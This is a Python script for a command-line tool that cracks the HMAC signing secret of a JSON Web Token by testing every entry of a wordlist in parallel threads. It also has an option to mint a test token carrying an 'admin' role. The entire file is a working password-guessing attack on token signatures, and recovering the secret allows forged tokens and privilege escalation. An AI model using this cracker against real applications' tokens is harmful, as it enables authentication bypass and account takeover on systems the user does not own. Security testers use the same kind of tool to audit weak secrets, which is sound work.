#!/usr/bin/env python3

import jwt
import base64
import hmac
import hashlib
import argparse
import concurrent.futures
from tqdm import tqdm
import time
import json
from typing import Optional, Dict, Any

class JWTCracker:
    def __init__(self, token: str, wordlist: str, algorithm: str = 'HS256', threads: int = 4):
        self.token = token
        self.wordlist = wordlist
        self.algorithm = algorithm
        self.threads = threads
        self.header: Optional[Dict[str, Any]] = None
        self.payload: Optional[Dict[str, Any]] = None
        self.signature: Optional[str] = None
        
    def parse_jwt(self) -> bool:
        """Parse and validate the JWT format"""
        try:
            # Split the token into its components
            parts = self.token.split('.')
            if len(parts) != 3:
                print("[-] Invalid JWT format")
                return False
                
            # Decode header and payload
            header_b64, payload_b64, self.signature = parts
            
            # Add padding if necessary
            header_b64 += '=' * (-len(header_b64) % 4)
            payload_b64 += '=' * (-len(payload_b64) % 4)
            
            # Decode and parse JSON
            self.header = json.loads(base64.b64decode(header_b64.replace('-', '+').replace('_', '/')))
            self.payload = json.loads(base64.b64decode(payload_b64.replace('-', '+').replace('_', '/')))
            
            print("[+] JWT successfully parsed")
            print(f"[*] Header: {json.dumps(self.header, indent=2)}")
            print(f"[*] Payload: {json.dumps(self.payload, indent=2)}")
            return True
            
        except Exception as e:
            print(f"[-] Error parsing JWT: {str(e)}")
            return False
            
    def verify_signature(self, secret: str) -> bool:
        """Verify if a secret key correctly signs the JWT"""
        try:
            jwt.decode(self.token, secret, algorithms=[self.algorithm])
            return True
        except jwt.InvalidSignatureError:
            return False
        except Exception:
            return False
            
    def crack_with_wordlist(self) -> Optional[str]:
        """Attempt to crack JWT using dictionary attack"""
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                words = f.read().splitlines()
                
            print(f"[*] Loaded {len(words)} potential keys from wordlist")
            print(f"[*] Starting dictionary attack with {self.threads} threads")
            
            def check_secret(secret: str) -> Optional[str]:
                if self.verify_signature(secret):
                    return secret
                return None
                
            # Use ThreadPoolExecutor for parallel processing
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                # Use tqdm for progress bar
                for result in tqdm(executor.map(check_secret, words), total=len(words), desc="Testing keys"):
                    if result:
                        return result
                        
            return None
            
        except FileNotFoundError:
            print(f"[-] Wordlist not found: {self.wordlist}")
            return None
            
    def generate_test_jwt(secret: str, payload: dict, algorithm: str = 'HS256') -> str:
        """Generate a test JWT for verification purposes"""
        return jwt.encode(payload, secret, algorithm=algorithm)

class CustomFormatter(argparse.RawDescriptionHelpFormatter):
    pass

def main():
    parser = argparse.ArgumentParser(
        description="""
JWT Cracking Tool
----------------
Attempts to crack JWT tokens using dictionary attacks.
Supports various JWT signing algorithms including HS256, HS384, and HS512.
        """,
        formatter_class=CustomFormatter
    )
    
    parser.add_argument('-t', '--token', required=True, help='JWT token to crack')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist file')
    parser.add_argument('-a', '--algorithm', default='HS256', 
                       choices=['HS256', 'HS384', 'HS512'],
                       help='JWT signing algorithm (default: HS256)')
    parser.add_argument('--threads', type=int, default=4,
                       help='Number of threads to use (default: 4)')
    parser.add_argument('--generate-test', action='store_true',
                       help='Generate a test JWT using the first word in the wordlist')
    
    args = parser.parse_args()
    
    # Generate test JWT if requested
    if args.generate_test:
        try:
            with open(args.wordlist, 'r') as f:
                test_secret = f.readline().strip()
            test_payload = {"user": "test", "role": "admin"}
            test_jwt = JWTCracker.generate_test_jwt(test_secret, test_payload, args.algorithm)
            print(f"[+] Generated test JWT with secret '{test_secret}':")
            print(f"[+] {test_jwt}")
            return
        except Exception as e:
            print(f"[-] Error generating test JWT: {str(e)}")
            return
    
    # Create JWT cracker instance
    cracker = JWTCracker(args.token, args.wordlist, args.algorithm, args.threads)
    
    # Parse JWT
    if not cracker.parse_jwt():
        return
    
    # Start cracking
    print("\n[*] Starting JWT cracking attempt...")
    start_time = time.time()
    
    try:
        result = cracker.crack_with_wordlist()
        
        if result:
            print(f"\n[+] Success! JWT secret found: {result}")
        else:
            print("\n[-] JWT secret not found in wordlist")
            
        print(f"[*] Time taken: {time.time() - start_time:.2f} seconds")
        
    except KeyboardInterrupt:
        print("\n[-] Cracking interrupted by user")
        print(f"[*] Time elapsed: {time.time() - start_time:.2f} seconds")

if __name__ == '__main__':
    main()